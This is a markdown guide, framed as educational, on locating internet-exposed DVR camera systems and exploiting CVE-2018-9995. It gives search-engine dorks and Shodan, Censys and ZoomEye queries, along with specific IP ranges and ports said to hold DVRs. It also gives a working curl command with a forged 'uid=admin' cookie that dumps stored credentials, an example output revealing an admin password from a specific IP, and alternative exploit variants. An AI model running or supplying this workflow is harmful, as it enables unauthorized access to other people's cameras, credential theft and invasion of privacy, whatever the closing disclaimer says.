# Finding DVR Systems (Educational Guide)

This guide explains different methods to identify potentially vulnerable DVR systems for research and educational purposes. **Always ensure you have explicit permission to test any systems you identify.**

## Google Dork Techniques

Google dorks are special search queries that help find specific types of web pages. Here are some effective dorks for finding DVR login interfaces:

### Basic DVR Login Page Dorks

```
intitle:"DVR LOGIN" -com
intitle:"DVR Login" -com
intitle:"XVR Login" -com
intitle:"MDVR Login" -com
intitle:"HVR Login" -com
```

### Advanced DVR Search Dorks

```
intitle:"DVR LOGIN" intext:"Username" intext:"Password"
intitle:login inurl:8000 -facebook -twitter
intitle:"Security DVR" "Login" "Password"
```

### Common IP Ranges

From our research, these IP ranges often contain DVR systems:
- 91.201.122.x (ports: 14, 80, 8080)
- 59.26.65.x (ports: 69, 80, 49152)
- 47.113.219.x (ports: 226, 443, 8000)
- 111.11.123.x (various ports)
- 183.136.225.x (various ports)

## Specialized Search Engines

### Shodan.io

Shodan is a search engine for Internet-connected devices. Use these queries:

1. Basic DVR search:
   ```
   title:"DVR LOGIN"
   ```

2. Search by HTTP header:
   ```
   http.component:"dvr" port:80,8080
   ```

3. Search by specific vendor:
   ```
   "Server: DVR Webserver" port:80
   ```

### Censys.io

Censys is another IoT search engine. Try these queries:

1. Basic search:
   ```
   services.banner.title="DVR LOGIN"
   ```

2. By port:
   ```
   services.port=8000 and services.http.response.html_title="DVR"
   ```

### ZoomEye

ZoomEye offers similar functionality:

```
app:"DVR Login"
title:"XVR Login"
```

## Port Scanning

DVRs commonly use these ports:
- 80 (HTTP)
- 8000, 8080 (Alternative HTTP)
- 443, 8443 (HTTPS)
- 37777 (Dahua DVR specific)
- 49152 (Common on some DVR brands)
- 554 (RTSP for video streaming)

## Identifying Vulnerable Systems

A potentially vulnerable system will:

1. Present a login page with "DVR LOGIN" or similar in the title
2. Run older firmware (pre-2018 in many cases)
3. Accept the cookie exploit: `uid=admin` and return user credentials

## Manual Vulnerability Testing

Once you've identified a potential DVR system, you can manually test if it's vulnerable to CVE-2018-9995 using the curl command:

```bash
curl "http://<dvr_host>:<port>/device.rsp?opt=user&cmd=list" -H "Cookie: uid=admin"
```

### Example of a Successful Test

```bash
curl "http://59.26.65.69:49152/device.rsp?opt=user&cmd=list" -H "Cookie: uid=admin"
{"result":0,"list":[{"uid":"admin","pwd":"Op1234567#","role":2,"enmac":0,"mac":"00:00:00:00:00:00","playback":4294967295,"view":4294967295,"rview":4294967295,"ptz":4294967295,"backup":4294967295,"opt":4294967295}]}
```

A successful exploitation will return credentials in a JSON format that includes:
- Username (`uid`)
- Password (`pwd`) 
- Role information (`role`)
- Other system permissions

### Interpreting Results

- If you receive a JSON response with user credentials as shown above, the system is vulnerable to CVE-2018-9995
- If you receive an error, empty response, or a differently formatted response, the system is likely not vulnerable
- Some systems may have been patched or use different firmware that isn't affected

## Alternative Exploits

For some DVR models, you might also try these variations:

```bash
# Alternative endpoint
curl "http://<dvr_host>:<port>/users.cgi?action=list" -H "Cookie: uid=admin"

# With different cookie
curl "http://<dvr_host>:<port>/device.rsp?opt=user&cmd=list" -H "Cookie: dvr_sessionid=admin"
```

## ⚠️ Legal and Ethical Warning

This information is provided **STRICTLY FOR EDUCATIONAL PURPOSES ONLY**. Unauthorized access to computer systems is:

1. Illegal under the Computer Fraud and Abuse Act and similar laws worldwide
2. Unethical and invasive of privacy
3. May result in criminal prosecution

**ONLY test systems you own or have explicit written permission to access.** 